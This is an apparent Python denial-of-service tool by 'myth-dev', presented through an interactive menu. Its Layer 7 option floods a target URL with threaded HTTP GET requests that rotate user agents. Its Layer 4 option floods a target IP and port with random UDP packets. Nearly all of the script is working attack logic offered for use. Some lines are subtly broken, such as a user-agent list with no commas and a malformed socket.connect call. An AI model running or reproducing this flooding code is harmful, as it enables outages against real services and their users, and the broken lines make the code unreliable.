# //Code by: myth-dev
# //Instagram: @thehackerworld_ or @mython_dev
# //Telegram: @myth_dev
# //Github: https://githun.com/mython-dev


from functions import *
import random
import threading

try:
    import requests
    import socket
except ImportError:
    print('Please run: sudo ./install.sh')

my_functions = Functions()
my_functions.clear()
my_functions.check_os()
my_functions.check_root()

my_fragments = Fragments()

whatlayers = WhatLayers()

my_banner = Banner()

def sprint(text, second=0.03):
    for line in text + '\n':
        stdout.write(line)
        stdout.flush()
        time.sleep(second)

my_banner.menu()

sprint(f'\t[1] Layer 7, (recommended).\n\n\t[2] Layer 4.\n\n\t[3] What means Layer 7 and Layer 4?\n\n\t[0] Exit!\n')

def attack():

    try:
        layer = input(f'{my_fragments.info2}{my_fragments.nc}Please choose method DOS attacks: ')
    except KeyboardInterrupt:
        sprint(f'\n{my_fragments.success}Exit! Thanks for using script!\n')
        sys.exit(1)

    if layer == '0':
        sprint(f'\n{my_fragments.success}Exit! Thanks for using script!\n')
        sys.exit(1)


    elif layer == '1':

        try:
            url_target = input(f'\n{my_fragments.info2}{my_fragments.nc}Enter Url: ')
            num_thread = int(input(f'\n{my_fragments.info2}{my_fragments.nc}Enter threads: '))
        except KeyboardInterrupt:
                print(f'\n{my_fragments.success}Exit! Thanks for using script!\n')
                sys.exit(0) 


        def attack_layer_7():

            USER_AGENTS = [
            "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.73 Safari/537.36 OPR/34.0.2036.25 (Edition Campaign 67)"
            "Opera/9.80 (Windows NT 5.0; MRA 6.0 (build 5711)) Presto/2.12.388 Version/12.11"
            "Mozilla/5.0 (Linux; Android 9; Mi A3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36"
            "Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-N960F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.1 Chrome/71.0.3578.99 Mobile Safari/537.36"
            "Mozilla/5.0 (Linux; Android 8.0.0; SM-J337P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.116 Mobile Safari/537.36"
            "Mozilla/5.0 (Linux; Android 9; BND-L21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36"
            "Mozilla/5.0 (Linux; Android 7.1.2; Redmi Note 5A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36"
            "Mozilla/5.0 (Linux; Android 7.1.2; Redmi 5 Plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36"
            "Mozilla/5.0 (Linux; Android 8.0.0; WAS-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36"
            "Mozilla/5.0 (Linux; Android 9; SM-A605FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36"
            "Mozilla/5.0 (Linux; Android 9; SM-J701M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36"
            "Mozilla/5.0 (Linux; Android 7.0; BLN-L21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36"
            "Mozilla/5.0 (Linux; Android 9; SM-N950N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36"
            "Mozilla/5.0 (Linux; Android 9; L270) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 YaBrowser/19.1.2.337.01 Safari/537.36"
            "Mozilla/5.0 (Linux; Android 9; SM-A600FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36"
            ]


            while True:
                headers={'User-Agent': random.choice(USER_AGENTS)}                           
                r = requests.get(url_target,headers=headers)


        try:
            for i in range(num_thread):
                th = threading.Thread(target = attack_layer_7)
                th.start()
        except KeyboardInterrupt:
            print(f'\n{my_fragments.success}Exit! Thanks for using script!\n')
            sys.exit(1)


        print(f'{my_fragments.success}{my_fragments.nc}Dos Attack Started | Stop attack {my_fragments.red}<CTRL + C>')

        return attack_layer_7()

    elif layer == '2':

        def attack_layer_4():

            try:
                sprint(f'\n{my_fragments.info2}{my_fragments.nc}For Example Ip: 64.233.161.102')
                ip_target = input(f'{my_fragments.info2}{my_fragments.nc}Enter Targets IP: ')
                port_target = int(input (f'{my_fragments.info2}{my_fragments.nc}Enter Targets Port: '))
            except KeyboardInterrupt:
                    print(f'\n{my_fragments.success}Exit! Thanks for using script!\n')
                    sys.exit(0)

            s = socket.socket (socket.AF_INET, socket.SOCK_DGRAM)

            s.connect(ip_target, port_target)

            for i in range(1, 100**1000):

                s.send(random._urandom (10)*1000)

                print(f"{my_fragments.success}Attack Start: {i} | Stop attack {my_fragments.red}<CTRL + C>'", end='\r')    
                    

        return attack_layer_4()


    elif layer == '3':
        whatlayers.what_means_layer() 
        attack()
    
if __name__ == "__main__":
    attack()